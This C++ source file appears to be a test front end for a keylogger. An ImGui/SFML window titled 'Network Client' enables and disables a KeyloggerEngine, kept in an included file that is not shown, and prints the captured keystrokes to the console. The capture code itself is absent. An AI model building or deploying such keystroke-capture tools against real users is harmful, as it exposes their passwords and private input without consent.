#include <bits/stdc++.h>
#include <windows.h>

#include <SFML/Graphics.hpp>
#include <SFML/Network.hpp>
#include <SFML/Audio.hpp>
#include <imgui.h>
#include <imgui-SFML.h>
#include "ImGuiStdString.hpp"
#include "KeyloggerEngine.cpp"

using namespace std;

bool isEnable = false;
std::string dummy;

void RunGui() {
    ImGui::Begin("TestKeylog", nullptr, ImGuiWindowFlags_None);

    if(!isEnable) {
        if(ImGui::Button("Enable")) {
            isEnable = true;
            KeyloggerEngine::getInstance().init();
        }
    } else {
        if(ImGui::Button("Disable")) {
            isEnable = false;
            KeyloggerEngine::getInstance().shouldStop();
            std::string tstr = KeyloggerEngine::getInstance().read();
            cout << " **** BEGIN ****" << tstr << "\n\n";
        }
    }

    ImGui::InputText("Dummy", &dummy);

    ImGui::End();
}

void RunSFMLBackend() {
    sf::RenderWindow window(sf::VideoMode(800, 600), "Network Client", 
                           sf::Style::Titlebar | sf::Style::Close);
    window.setVerticalSyncEnabled(true);
    
    if (!ImGui::SFML::Init(window)) {
        throw std::runtime_error("Failed to initialize ImGui-SFML");
    }
    ImGui::StyleColorsDark();
    ImGui::GetIO().IniFilename = nullptr;

    sf::Clock deltaClock;
    while (window.isOpen()) {
        sf::Event event;
        while (window.pollEvent(event)) {
            ImGui::SFML::ProcessEvent(window, event);
            if (event.type == sf::Event::Closed) {
                window.close();
            }
        }

        ImGui::SFML::Update(window, deltaClock.restart());
        RunGui();
        
        window.clear(sf::Color(30, 30, 40));
        ImGui::SFML::Render(window);
        window.display();
    }

    ImGui::SFML::Shutdown();
}

/*
int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, WCHAR *lpCmdLine, int nCmdShow) {
    //Attach console for debugging
    if (AttachConsole(ATTACH_PARENT_PROCESS) || AllocConsole()) {
        freopen("CONOUT$", "w", stdout);
        freopen("CONOUT$", "w", stderr);
    }
*/
int main() {

    try {
        RunSFMLBackend();
    } catch (const std::exception& e) {
        std::cerr << "Fatal error: " << e.what() << std::endl;
    }

    WSACleanup();
    return 0;
}